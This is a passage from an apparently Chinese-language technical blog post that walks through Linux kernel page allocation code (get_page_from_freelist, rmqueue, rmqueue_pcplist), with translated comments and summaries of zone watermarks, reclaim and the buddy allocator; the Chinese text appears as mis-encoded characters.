class="keyword">continue</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * åœ¨åˆ†é…é¡µç¼“å­˜ï¼ˆpage cacheï¼‰é¡µä»¥è¿›è¡Œå†™å…¥æ—¶, æˆ‘ä»¬æƒ³è¦</span></span><br><span class="line"><span class="comment"> * åœ¨ä¸€ä¸ªèŠ‚ç‚¹çš„â€œè„é™åˆ¶â€ï¼ˆdirty limitï¼‰å†…è·å¾—ä»–, </span></span><br><span class="line"><span class="comment">         * ç”±æ­¤ï¼Œæ²¡æœ‰ä¸€ä¸ªèŠ‚ç‚¹æœ‰ç€è¶…è¿‡å…¨å±€å…è®¸çš„è„é¡µæ¯”ä¾‹ã€‚</span></span><br><span class="line"><span class="comment"> * è„é™åˆ¶è€ƒè™‘äº†èŠ‚ç‚¹çš„ä½ç«¯å†…å­˜ä¿ç•™å’Œé«˜æ°´ä½çº¿ï¼Œ</span></span><br><span class="line"><span class="comment"> * ä»¥ä¾¿äº kswapd èƒ½å¹³è¡¡å®ƒï¼Œè€Œä¸å¿…ä»å…¶ LRU åˆ—è¡¨ä¸­å†™å…¥é¡µé¢ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">XXX:</span> ç°åœ¨, åœ¨è¿›å…¥å›æ”¶ä¹‹å‰ï¼Œ</span></span><br><span class="line"><span class="comment"> * å…è®¸åˆ†é…å¯èƒ½è¶…è¿‡ æ…¢é€Ÿè·¯å¾„ä¸­ (spread_dirty_pages unset)</span></span><br><span class="line"><span class="comment"> * å•èŠ‚ç‚¹çš„ dirty limitï¼Œè¿™åœ¨ä¸€ä¸ªå…è®¸èŠ‚ç‚¹ä»¬åœ¨ä¸€èµ·éƒ½æœªå¤Ÿå¤§ä»¥è¾¾åˆ°å…¨å±€é™åˆ¶</span></span><br><span class="line"><span class="comment">         * çš„ NUMA è®¾ç½®ä¸­æ˜¯å¾ˆé‡è¦çš„ã€‚å¯¹äºè¿™äº›æƒ…å†µçš„åˆé€‚çš„ä¿®è¡¥å°†éœ€è¦å¯¹</span></span><br><span class="line"><span class="comment"> * dirty-throttling ä¸ flusher threads ä¸­èŠ‚ç‚¹çš„æ„è¯†.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// è¯‘æ³¨ï¼šåŸæ–‡å°±æ˜¯XXXï¼Œç¬”è€…ä¹Ÿä¸çŸ¥é“è¿™ä¸ªXXXæ˜¯ä»€ä¹ˆ...</span></span><br><span class="line">        <span class="comment">// å¤§æ¦‚å°±æ˜¯æ£€æŸ¥å½“å‰zoneå¯¹åº”nodeçš„è„é¡µæ•°é‡æ˜¯ä¸æ˜¯è¾¾åˆ°é™åˆ¶äº†</span></span><br><span class="line"><span class="keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;</span><br><span class="line"><span class="keyword">if</span> (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;</span><br><span class="line">last_pgdat_dirty_limit = zone-&gt;zone_pgdat;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// node æ•°é‡å¤§äº1ï¼Œä¸”å½“å‰ zone å¹¶é preferred zone</span></span><br><span class="line"><span class="keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;</span><br><span class="line"><span class="type">int</span> local_nid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è‹¥ç§»åŠ¨åˆ°äº† remote nodeï¼ˆè¯‘æ³¨ï¼šéå½“å‰nodeï¼Ÿï¼‰, åˆ™é‡è¯•ï¼Œ</span></span><br><span class="line"><span class="comment"> * ä½†å…è®¸ fragmenting fallbacks. å±€éƒ¨æ€§æ¯”é¿å…ç¢ç‰‡æ›´åŠ é‡è¦ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">            <span class="comment">// æ¯”å¯¹å½“å‰ zone æ˜¯å¦åœ¨ local nodeï¼ˆå°±æ˜¯ç¦»å½“å‰CPUæœ€è¿‘é‚£ä¸ª nodeï¼‰</span></span><br><span class="line">            <span class="comment">// è‹¥å¦ï¼Œåˆ™å»æ‰ ALLOC_NOFRAGMENT æ ‡å¿—ä½ï¼Œå¹¶ä» preferred zone å¼€å§‹é‡è¯•ã€‚</span></span><br><span class="line">            <span class="comment">// å³ï¼škernel æ›´å€¾å‘äºä¼˜å…ˆä» local zone è¿›è¡Œåˆ†é…ï¼Œå“ªæ€•ä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡</span></span><br><span class="line">local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);</span><br><span class="line"><span class="keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;</span><br><span class="line">alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–å½“å‰ zone çš„æ°´ä½çº¿æ ‡è®°</span></span><br><span class="line">mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);</span><br><span class="line"><span class="keyword">if</span> (!zone_watermark_fast(zone, order, mark,</span><br><span class="line">       ac-&gt;highest_zoneidx, alloc_flags,</span><br><span class="line">       gfp_mask)) &#123; <span class="comment">// æ°´ä½çº¿ç›¸å…³æ“ä½œ</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è¯¥ zone çš„æ°´ä½çº¿å¤±è´¥, ä½†è‹¥å…¶åŒ…å«äº† deferred pagesï¼Œ</span></span><br><span class="line"><span class="comment"> * åˆ™æˆ‘ä»¬ä¼šçœ‹è¯¥ zone æ˜¯å¦è¿˜èƒ½å†è¿›è¡Œæ‰©å±•</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;</span><br><span class="line"><span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Checked here to keep the fast path fast */</span></span><br><span class="line">BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);</span><br><span class="line">            <span class="comment">// è¯¥æ ‡å¿—ä½æ„ä¸ºã€ä¸æ£€æŸ¥æ°´ä½çº¿ã€‘ï¼Œæ­¤æ—¶æˆ‘ä»¬ç›´æ¥å°è¯•ä»è¯¥ zone ä¸­åˆ†é…</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node_reclaim_mode == <span class="number">0</span> ||</span><br><span class="line">    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// é¦–å…ˆè¿›è¡Œé¡µé¢å›æ”¶ï¼Œä¹‹åæŸ¥çœ‹æ˜¯å¦æ»¡è¶³æ°´ä½çº¿è¦æ±‚ï¼Œè‹¥â€˜</span></span><br><span class="line">            <span class="comment">// ä¸æ‰«æ/æ²¡æœ‰å¯å›æ”¶/æ£€æŸ¥æœªé€šè¿‡</span></span><br><span class="line">            <span class="comment">// åˆ™éƒ½ä¼šè¿›è¡Œä¸‹ä¸€æ¬¡è¿­ä»£ï¼Œå°è¯•ä¸‹ä¸€ä¸ª zone</span></span><br><span class="line">ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);</span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line"><span class="keyword">case</span> NODE_RECLAIM_NOSCAN:</span><br><span class="line"><span class="comment">/* ä¸æ‰«æ */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> NODE_RECLAIM_FULL:</span><br><span class="line"><span class="comment">/* æ‰«æäº†ä½†ä¸å¯å›æ”¶ */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">/* æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦å›æ”¶äº†è¶³å¤Ÿé¡µé¢ */</span></span><br><span class="line"><span class="keyword">if</span> (zone_watermark_ok(zone, order, mark,</span><br><span class="line">ac-&gt;highest_zoneidx, alloc_flags))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_this_zone:</span><br><span class="line">        <span class="comment">// æ¥åˆ°è¯¥ label è¡¨ç¤ºæˆ‘ä»¬ç»ˆäºé€šè¿‡äº†å‰é¢ä¸€ç³»åˆ—çš„å„ç§æ£€æŸ¥ï¼Œç°åœ¨å¼€å§‹æ­£å¼è¿›è¡Œé¡µé¢åˆ†é…</span></span><br><span class="line">        <span class="comment">// **************************</span></span><br><span class="line">        <span class="comment">// rmqueue() å³ä¸ºæˆ‘ä»¬åœ¨OSæ•™ç§‘ä¹¦ä¸Šçœ‹åˆ°çš„çš„ buddy system æ¨¡å‹,</span></span><br><span class="line">        <span class="comment">// å– freelist å¯¹åº”ä¸‹æ ‡ pageï¼Œè‹¥æ— åˆ™å‘ä¸Šéå†æ‹†æ›´é«˜ order çš„ page</span></span><br><span class="line">        <span class="comment">// **************************</span></span><br><span class="line">page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,</span><br><span class="line">gfp_mask, alloc_flags, ac-&gt;migratetype);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">prep_new_page(page, order, gfp_mask, alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è‹¥è¿™æ˜¯ä¸€ä¸ªé«˜é˜¶çš„åŸå­åˆ†é…ï¼Œ</span></span><br><span class="line"><span class="comment"> * æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦è¯¥ä¸ºå°†æ¥ä¿ç•™ pageblock</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))</span><br><span class="line">reserve_highatomic_pageblock(page, zone, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;<span class="comment">// å–åˆ°äº†ï¼Œè¿”å›</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">// æ²¡å–åˆ°</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/* è‹¥è¯¥ zone æœ‰ deferred pagesï¼Œå†è¯•ä¸€é */</span></span><br><span class="line"><span class="keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;</span><br><span class="line"><span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * åœ¨ä¸€å° UMA æœºå™¨ä¸Šå¯èƒ½æ‰€ä»¥çš„ zone éƒ½æ˜¯ç ´ç¢çš„ï¼Œ</span></span><br><span class="line"><span class="comment"> * è‹¥é¿å…ç¢ç‰‡, é‡ç½®å¹¶é‡è¯•.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (no_fallback) &#123;</span><br><span class="line">alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æµç¨‹æ€»ç»“å¦‚ä¸‹ï¼š</p><ul><li><p><code>for_next_zone_zonelist_nodemask</code> è¿­ä»£éå†åˆ†é…ä¸Šä¸‹æ–‡ä¸­ zonelist ä¸­çš„ zoneref æ•°ç»„ å¯¹åº”çš„ zone</p><blockquote><p>å…¶æ ¸å¿ƒæ˜¯å•æ¬¡è¿­ä»£è°ƒç”¨ next_zones_zonelist()ï¼Œè¯¥å‡½æ•°è¿”å›:</p><ul><li>åœ¨ nodemask çš„ zone ä¸­ï¼Œä»¥å½“å‰ zone ä½œä¸ºèµ·ç‚¹æ¸¸æ ‡çš„ã€ä½äºæˆ–ä½äºã€‘highest_zoneidx çš„ä¸‹ä¸€ä¸ª zone</li></ul></blockquote><ul><li><p>è‹¥å¼€å¯äº† cpusetï¼Œæ£€æŸ¥å½“å‰ zone æ˜¯å¦æ»¡è¶³ cpuset çš„è¦æ±‚ï¼Œè‹¥å¦ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zone</p></li><li><p>æ£€æŸ¥å½“å‰ zone å¯¹åº” node çš„è„é¡µæ•°é‡æ˜¯å¦è¶…å‡ºé™åˆ¶ï¼Œè‹¥å¦ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zone</p></li><li><p>è‹¥ <code>ALLOC_NOFRAGMENT</code> ä½†æ˜¯å½“å‰ zone é preferred zoneã€ä¸”å¯¹åº” node ä¸º remote nodeï¼Œåˆ™æ¸…é™¤è¯¥æ ‡å¿—ä½å<strong>é‡æ–°å¼€å§‹åˆ†é…</strong>ï¼Œå› ä¸º locality æ¯”é¿å…ç¢ç‰‡æ›´åŠ é‡è¦</p></li><li><p>è·å–å½“å‰ zone çš„æ°´ä½çº¿æ ‡è®°</p><ul><li>è‹¥æ˜¯è®¾ç½®äº† <code>ALLOC_NO_WATERMARKS</code> åˆ™ç›´æ¥åˆ°ä¸‹ä¸€æ­¥è¿›è¡Œåˆ†é…</li><li>è‹¥æ°´ä½çº¿æ£€æŸ¥æœªé€šè¿‡ï¼Œè°ƒç”¨ <code>node_reclaim()</code> è¿›è¡Œé¡µé¢å›æ”¶</li><li>è‹¥å›æ”¶åé¡µé¢è¿˜æ˜¯ä¸è¶³ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zone</li></ul></li><li><p>è°ƒç”¨ <code>rmqueue()</code> æ­£å¼è¿›è¡Œå†…å­˜åˆ†é…ï¼Œè¯¥å‡½æ•°å³ä¸º buddy system åˆ†é…ç®—æ³•</p></li></ul></li></ul><p><img src="https://s2.loli.net/2022/07/05/SJMKys31ofnTPXc.png" alt="å·çš„å›¾.png"></p><h4 id="rmqueue-ï¼šä»ç»™å®šçš„-page-ä¸­è¿›è¡Œé¡µé¢åˆ†é…"><a href="#rmqueue-ï¼šä»ç»™å®šçš„-page-ä¸­è¿›è¡Œé¡µé¢åˆ†é…" class="headerlink" title="rmqueue()ï¼šä»ç»™å®šçš„ page ä¸­è¿›è¡Œé¡µé¢åˆ†é…"></a>rmqueue()ï¼šä»ç»™å®šçš„ page ä¸­è¿›è¡Œé¡µé¢åˆ†é…</h4><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œä¸»è¦æ˜¯ä»ç»™å®š zone ä¸­è¿›è¡Œå†…å­˜åˆ†é…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ä»ç»™å®š zone ä¸­è¿›è¡Œå†…å­˜åˆ†é…. å¯¹äº order-0 çš„åˆ†é…åˆ™ä½¿ç”¨ pcplists.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span></span><br><span class="line"><span class="keyword">struct</span> page *<span class="title function_">rmqueue</span><span class="params">(<span class="keyword">struct</span> zone *preferred_zone,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> zone *zone, <span class="type">unsigned</span> <span class="type">int</span> order,</span></span><br><span class="line"><span class="params"><span class="type">gfp_t</span> gfp_flags, <span class="type">unsigned</span> <span class="type">int</span> alloc_flags,</span></span><br><span class="line"><span class="params"><span class="type">int</span> migratetype)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(order == <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_MOVABLE çš„ pcplist å¯èƒ½åœ¨ CMA åŒºåŸŸæœ‰ç€é¡µé¢ï¼Œ</span></span><br><span class="line"><span class="comment"> * å½“ä» CMA çš„åˆ†é…ä¸è¢«å…è®¸æ—¶æˆ‘ä»¬éœ€è¦ç•¥è¿‡å®ƒ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// å¯¹äº order-0 çš„åˆ†é…ï¼Œ</span></span><br><span class="line">        <span class="comment">// è‹¥æ²¡æœ‰å¼€å¯ CMA | è®¾ç½®äº† ALLOC_CMA | è¿ç§»ç±»å‹é MIGRATE_MOVABLE</span></span><br><span class="line">        <span class="comment">// åˆ™å…ˆä» pcplist ä¸Šåˆ†é…</span></span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||</span><br><span class="line">migratetype != MIGRATE_MOVABLE) &#123;</span><br><span class="line">page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,</span><br><span class="line">migratetype, alloc_flags);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æˆ‘ä»¬ç»ä¸å¸Œæœ› callers å°è¯•</span></span><br><span class="line"><span class="comment"> * åœ¨å¸¦æœ‰ __GFP_NOFAIL æ—¶åˆ†é…å¤§äº order-1 çš„é¡µ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="number">1</span>));</span><br><span class="line">spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è‹¥ç”±äºéCMAçš„åˆ†é…ä¸Šä¸‹æ–‡å¯¼è‡´ç•¥è¿‡äº† pcplistï¼Œåˆ™order-0 çš„è¯·æ±‚å¯ä»¥åˆ°è¾¾æ­¤å¤„.</span></span><br><span class="line"><span class="comment"> * HIGHATOMIC åŒºåŸŸä¸ºæ›´é«˜ order çš„åŸå­åˆ†é…æ‰€ä¿ç•™ï¼Œ</span></span><br><span class="line"><span class="comment"> * æ•… order-0 çš„è¯·æ±‚åº”ç•¥è¿‡å®ƒã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// è‹¥ order &gt; 0 ä¸”å¸¦æœ‰ ALLOC_HARDER æ ‡å¿—ä½ï¼Œè°ƒç”¨ __rmqueue_smallest() åˆ†é…</span></span><br><span class="line">        <span class="comment">// è¿™ä¸ªæ ‡å¿—ä½æ„ä¸ºå°†æ°´ä½çº¿å‡å» 1/4ï¼Œå®é™…ä¸Š GFP_ATOMIC ä¸­ä¾¿ä¼šåŒ…å«è¯¥æ ‡å¿—ä½</span></span><br><span class="line"><span class="keyword">if</span> (order &gt; <span class="number">0</span> &amp;&amp; alloc_flags &amp; ALLOC_HARDER) &#123;</span><br><span class="line">page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line">trace_mm_page_alloc_zone_locked(page, order, migratetype);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ __rmqueue() è¿›è¡Œåˆ†é…ï¼Œè¿™ä¸ªå°±æ˜¯çœŸæ­£çš„æ ¸å¿ƒåˆ†é…å‡½æ•°äº†</span></span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line">page = __rmqueue(zone, order, migratetype, alloc_flags);</span><br><span class="line">&#125; <span class="keyword">while</span> (page &amp;&amp; check_new_pages(page, order)); <span class="comment">// è¿™ä¸ªæ£€æŸ¥å‡½æ•°é€šè¿‡äº†è¿”å›false</span></span><br><span class="line">spin_unlock(&amp;zone-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">goto</span> failed;</span><br><span class="line">__mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">  get_pcppage_migratetype(page));</span><br><span class="line"></span><br><span class="line">__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span> &lt;&lt; order);</span><br><span class="line">zone_statistics(preferred_zone, zone);</span><br><span class="line">local_irq_restore(flags);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="comment">/* Separate test+clear to avoid unnecessary atomics */</span></span><br><span class="line"><span class="keyword">if</span> (test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags)) &#123;</span><br><span class="line">clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);</span><br><span class="line">wakeup_kswapd(zone, <span class="number">0</span>, <span class="number">0</span>, zone_idx(zone));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line"></span><br><span class="line">failed:</span><br><span class="line">local_irq_restore(flags);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æå‡½æ•°æµç¨‹å‰æˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹è¿™ä¸ªæ¦‚å¿µâ€”â€”<code>per-cpu pageset</code> ï¼Œè¿™æ˜¯ zone ä¸Šçš„ä¸€ä¸ª per-cpu çš„é¡µé¢é›†ï¼Œåœ¨åˆ†é…æ—¶ä¼šä¼˜å…ˆä»è¿™é‡Œè¿›è¡Œåˆ†é…</p><p>è¯¥å‡½æ•°å…¶å®è¿˜æ˜¯å¯¹åˆ†é…çš„æ ¸å¿ƒé€»è¾‘çš„å°è£…ï¼Œä¸»è¦æ˜¯ä»¥ä¸‹æµç¨‹ï¼š</p><ul><li>åˆ†é…çš„ order ä¸º 0ï¼Œè‹¥æ²¡æœ‰å¼€å¯ CMA | è®¾ç½®äº† ALLOC_CMA | è¿ç§»ç±»å‹é MIGRATE_MOVABLEï¼Œåˆ™å°è¯•ä» per-cpu pageset ä¸­åˆ†é…å¹¶è¿”å›</li><li>order &gt; 0ï¼Œè°ƒç”¨ <code>__rmqueue_smallest()</code> è¿›è¡Œé¡µé¢åˆ†é…</li><li>ä¹‹å‰æœªåˆ†é…æˆåŠŸï¼Œè°ƒç”¨ <code>__rmqueue()</code> è¿›è¡Œé¡µé¢åˆ†é…</li><li>ç»“æœæ£€æŸ¥ï¼Œå…¶ä¸­å¾ªç¯å†…æ˜¯ç”¨ <code>check_new_pages()</code>ï¼Œæœªé€šè¿‡åˆ™é‡æ–°å¾ªç¯ï¼ˆå›åˆ°ç¬¬äºŒæ­¥ï¼‰</li></ul><h5 id="â‘ -rmqueue-pcplist-ï¼šä»-per-cpu-pageset-ä¸Šåš-order-0-çš„åˆ†é…"><a href="#â‘ -rmqueue-pcplist-ï¼šä»-per-cpu-pageset-ä¸Šåš-order-0-çš„åˆ†é…" class="headerlink" title="â‘  rmqueue_pcplist()ï¼šä» per-cpu pageset ä¸Šåš order-0 çš„åˆ†é…"></a>â‘  rmqueue_pcplist()ï¼šä» per-cpu pageset ä¸Šåš order-0 çš„åˆ†é…</h5><p>ä¸»è¦æ˜¯å…³ä¸­æ–­â†’é¡µé¢åˆ†é…â†’å¼€ä¸­æ–­ä¸‰æ­¥èµ°ï¼Œæœ€ååˆ†é…è°ƒç”¨åˆ°çš„æ˜¯ <code>__rmqueue_pcplist()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Lock and remove page from the per-cpu list */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *<span class="title function_">rmqueue_pcplist</span><span class="params">(<span class="keyword">struct</span> zone *preferred_zone,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> zone *zone, <span class="type">gfp_t</span> gfp_flags,</span></span><br><span class="line"><span class="params"><span class="type">int</span> migratetype, <span class="type">unsigned</span> <span class="type">int</span> alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">local_irq_save(flags); <span class="comment">// å…³ä¸­æ–­</span></span><br><span class="line">pcp = &amp;this_cpu_ptr(zone-&gt;pageset)-&gt;pcp;</span><br><span class="line"><span class="built_in">list</span> = &amp;pcp-&gt;lists[migratetype]; <span class="comment">// è·å–è¿ç§»ç±»å‹é“¾è¡¨</span></span><br><span class="line">page = __rmqueue_pcplist(zone,  migratetype, alloc_flags, pcp, <span class="built_in">list</span>); <span class="comment">// åˆ†é…</span></span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span>);</span><br><span class="line">zone_statistics(preferred_zone, zone);</span><br><span class="line">&#125;</span><br><span class="line">local_irq_restore(flags); <span class="comment">// å¼€ä¸­æ–­</span></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__rmqueue_pcplist()</code> ä¸»è¦å°±æ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œè‹¥ pcplist ä¸ºç©ºåˆ™è°ƒç”¨ <code>rmqueue_bulk()</code> å…ˆä» zone ä¸Šæ‹¿ pagesï¼Œä¹‹åå°±æ˜¯ç®€å•çš„é“¾è¡¨è„±é“¾ï¼Œåˆ†é…ç»“æœä½¿ç”¨ <code>check_new_page()</code> 